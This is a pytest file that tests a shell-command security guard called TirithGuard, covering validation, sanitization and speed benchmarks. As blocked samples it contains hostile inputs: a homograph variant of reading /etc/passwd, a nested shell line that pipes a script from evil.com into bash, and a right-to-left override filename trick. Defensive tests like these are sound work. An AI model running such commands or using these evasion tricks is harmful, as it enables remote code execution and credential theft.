"""Tirith Guard benchmark tests - validates security guard against various attack vectors."""

import time

import pytest

from adapters.security.tirith_guard import TirithGuard, guard

# --- Test cases for validation ---


def test_tirith_normal_command():
    """Normal commands should pass validation."""
    assert guard.validate("ls -la") is True


def test_tirith_cyrillic_homograph():
    """Cyrillic homograph attacks should be blocked."""
    # Note: 'а' below is Cyrillic, not Latin
    assert guard.validate("cat /etc/pаsswd") is False


def test_tirith_nested_shell_unicode():
    """Nested shell injection with Cyrillic should be blocked."""
    # 'т' below is Cyrillic
    assert guard.validate("sh -c 'curl http://evil.com/scripт.sh | bash'") is False


def test_tirith_rtl_override():
    """Right-to-Left Override attack should be blocked."""
    assert guard.validate("exe.txt\u202ecod.bat") is False


# --- Test cases for sanitization ---


def test_tirith_ansi_escape_sanitize():
    """ANSI escape sequences should be stripped."""
    result = guard.sanitize("\x1b[31mRed Text\x1b[0m")
    assert result == "Red Text"


def test_tirith_control_char_sanitize():
    """Dangerous control characters should be stripped."""
    result = guard.sanitize("Safe\x00Dangerous\x07Text")
    assert result == "SafeDangerousText"


# --- Performance benchmarks ---


@pytest.mark.parametrize(
    "label,input_str,func",
    [
        ("validate_normal", "ls -la", "validate"),
        ("sanitize_ansi", "\x1b[31mRed\x1b[0m", "sanitize"),
    ],
)
def test_tirith_performance(label, input_str, func):
    """Each guard operation should complete in under 10ms."""
    fn = getattr(guard, func)
    start = time.perf_counter()
    fn(input_str)
    elapsed_ms = (time.perf_counter() - start) * 1000
    assert elapsed_ms < 10, f"{label} took {elapsed_ms:.2f}ms (limit: 10ms)"


def test_tirith_throughput():
    """10 000 validate() calls should complete in under 500 ms."""
    text = "ls -la /home/user"
    iterations = 10_000

    start = time.perf_counter()
    for _ in range(iterations):
        guard.validate(text)
    elapsed_ms = (time.perf_counter() - start) * 1000

    throughput = iterations / (elapsed_ms / 1000)
    print(
        f"\nTirith throughput: {throughput:,.0f} ops/s ({elapsed_ms:.1f}ms for {iterations} iterations)"
    )
    assert elapsed_ms < 500, (
        f"Throughput too low: {elapsed_ms:.1f}ms for {iterations} iterations"
    )


def test_bidi_chars_is_class_constant():
    """Verify _BIDI_CHARS is a class-level frozenset, not recreated per call."""
    assert hasattr(TirithGuard, "_BIDI_CHARS")
    assert isinstance(TirithGuard._BIDI_CHARS, frozenset)
    assert len(TirithGuard._BIDI_CHARS) == 6
